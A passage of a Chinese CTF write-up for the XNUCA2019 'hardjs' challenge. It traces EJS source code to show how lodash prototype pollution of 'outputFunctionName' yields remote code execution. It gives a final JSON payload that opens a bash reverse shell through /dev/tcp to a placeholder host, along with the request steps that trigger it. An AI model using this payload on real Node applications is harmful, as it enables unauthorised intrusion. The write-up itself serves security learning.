+        <span class="nx">appended</span> <span class="o">+=</span> <span class="s1">&#39;  }&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="nx">appended</span> <span class="o">+=</span> <span class="s1">&#39;  return __output.join(&#34;&#34;);&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+      <span class="k">this</span><span class="p">.</span><span class="nx">source</span> <span class="o">=</span> <span class="nx">prepended</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">source</span> <span class="o">+</span> <span class="nx">appended</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="p">...</span>
+      <span class="nx">src</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">source</span><span class="p">;</span>
+    <span class="p">...</span>
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="kr">async</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Have to use generated function for this, since in envs without support,
+</span><span class="c1"></span>        <span class="c1">// it breaks in parsing
+</span><span class="c1"></span>        <span class="k">try</span> <span class="p">{</span>
+          <span class="nx">ctor</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nb">Function</span><span class="p">(</span><span class="s1">&#39;return (async function(){}).constructor;&#39;</span><span class="p">))();</span>
+        <span class="p">}</span>
+        <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span><span class="nx">e</span> <span class="k">instanceof</span> <span class="nx">SyntaxError</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;This environment does not support async/await&#39;</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="k">else</span> <span class="p">{</span>
+            <span class="k">throw</span> <span class="nx">e</span><span class="p">;</span>
+          <span class="p">}</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">ctor</span> <span class="o">=</span> <span class="nb">Function</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="nx">fn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctor</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">localsName</span> <span class="o">+</span> <span class="s1">&#39;, escapeFn, include, rethrow&#39;</span><span class="p">,</span> <span class="nx">src</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="p">...</span>
+
+    <span class="c1">// Return a callable function which will execute the function
+</span><span class="c1"></span>    <span class="c1">// created by the source-code, with the passed data as locals
+</span><span class="c1"></span>    <span class="c1">// Adds a local `include` function which allows full recursive include
+</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">returnedFn</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+      <span class="kd">var</span> <span class="nx">include</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">includeData</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopy</span><span class="p">({},</span> <span class="nx">data</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">includeData</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">d</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopy</span><span class="p">(</span><span class="nx">d</span><span class="p">,</span> <span class="nx">includeData</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nx">includeFile</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">opts</span><span class="p">)(</span><span class="nx">d</span><span class="p">);</span>
+      <span class="p">};</span>
+      <span class="k">return</span> <span class="nx">fn</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">context</span><span class="p">,</span> <span class="p">[</span><span class="nx">data</span> <span class="o">||</span> <span class="p">{},</span> <span class="nx">escapeFn</span><span class="p">,</span> <span class="nx">include</span><span class="p">,</span> <span class="nx">rethrow</span><span class="p">]);</span>
+    <span class="p">};</span>
+    <span class="nx">returnedFn</span><span class="p">.</span><span class="nx">dependencies</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">dependencies</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">returnedFn</span><span class="p">;</span>
+  <span class="p">},</span>
+</code></pre></div><p>这段代码中</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">&#39;  var &#39;</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span> <span class="o">+</span> <span class="s1">&#39; = __append;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+      <span class="p">}</span>
+</code></pre></div><p>就是我们一直寻找的东西，这个对象会与其他生成的模板字符串一起拼接到<code>this.source</code>，然后传递给<code>src</code>，接着是<code>fn</code>，然后以<code>returnedFn</code>返回并最后被执行。而一路跟进的时候可以发现，并没有<code>outputFunctionName</code>的身影，所以只要给Object的<code>prototype</code>加上这个成员，我们就可以实现从原型链污染到RCE的攻击过程了！</p>
+<h2 id="成功攻击">成功攻击</h2>
+<p>可以发现<code>process</code>是可以访问到的，所以我们可以用来反弹shell</p>
+<p><figure style="flex-grow: 1310; flex-basis: 3145px">
+		<a href="/p/xnuca2019-hardjs-writeup/1566806662894.png" data-size="734x56"><img src="/p/xnuca2019-hardjs-writeup/1566806662894.png"
+				
+				width="734"
+				height="56"
+				loading="lazy"
+				>
+		</a>
+		
+	</figure></p>
+<p>最后的payload如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="p">{</span>
+    <span class="s2">&#34;content&#34;</span><span class="o">:</span> <span class="p">{</span>
+        <span class="s2">&#34;constructor&#34;</span><span class="o">:</span> <span class="p">{</span>
+            <span class="s2">&#34;prototype&#34;</span><span class="o">:</span> <span class="p">{</span>
+			<span class="s2">&#34;outputFunctionName&#34;</span><span class="o">:</span><span class="s2">&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\&#34;&#39;);var __tmp2&#34;</span><span class="p">,</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">},</span>
+    <span class="s2">&#34;type&#34;</span><span class="o">:</span> <span class="s2">&#34;test&#34;</span>
+<span class="p">}</span>
+</code></pre></div><p><figure style="flex-grow: 287; flex-basis: 690px">
+		<a href="/p/xnuca2019-hardjs-writeup/1566806760189.png" data-size="1245x433"><img src="/p/xnuca2019-hardjs-writeup/1566806760189.png"
+				
+				width="1245"
+				height="433"
+				loading="lazy"
+				>
+		</a>
+		
+	</figure></p>
+<p>发送5次请求，然后访问<code>/get</code>进行原型链污染，最后访问<code>/</code>或<code>/login</code>触发<code>render</code>函数，成功反弹shell并getflag</p>
+<p><figure style="flex-grow: 189; flex-basis: 455px">
+		<a href="/p/xnuca2019-hardjs-writeup/1566636504751.png" data-size="868x457"><img src="/p/xnuca2019-hardjs-writeup/1566636504751.png"
+				
+				width="868"
+				height="457"
+				loading="lazy"
+				>
+		</a>
+		
+	</figure></p>
+<h2 id="总结">总结</h2>
+<p>原型链危害不小，不过找到合适的利用点也很花费审计的时间和精力，原先还以为这是个非预期，投稿的时候看到WP才知道这也在出题师傅的意料之中，tql。</p>
+<h2 id="参考链接">参考链接</h2>
+<p><a class="link" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html"  target="_blank" rel="noopener"
+    >https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
+<p><a class="link" href="https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/"  target="_blank" rel="noopener"
+    >https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/</a></p>
+<p><a class="link" href="https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/"  target="_blank" rel="noopener"
+    >https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/</a></p>
+<p><a class="link" href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs"  target="_blank" rel="noopener"
+    >https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</a></p>
+<p><a class="link" href="https://www.anquanke.com/post/id/177093"  target="_blank" rel="noopener"
+    >https://www.anquanke.com/post/id/177093</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web/">Web</a>
+        
+            <a href="/tags/nodejs/">Nodejs</a>
+        
+            <a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/p/a-trick-in-dom-xss/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">探索DOM XSS一个trick的原理</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/starctf2021-oh-my-socket/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">*ctf2021 oh-my-socket 复现</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+     
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="eifiz/eifiz.github.io"
+        issue-term="pathname"
+        
+        label="Comment"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2021 Eifiz Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.1.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#初步分析">初步分析</a></li>
+    <li><a href="#发现问题">发现问题</a></li>
+    <li><a href="#尝试xss攻击">尝试XSS攻击</a></li>
+    <li><a href="#挖掘后端攻击方法">挖掘后端攻击方法</a></li>
+    <li><a href="#成功攻击">成功攻击</a></li>
+    <li><a href="#总结">总结</a></li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
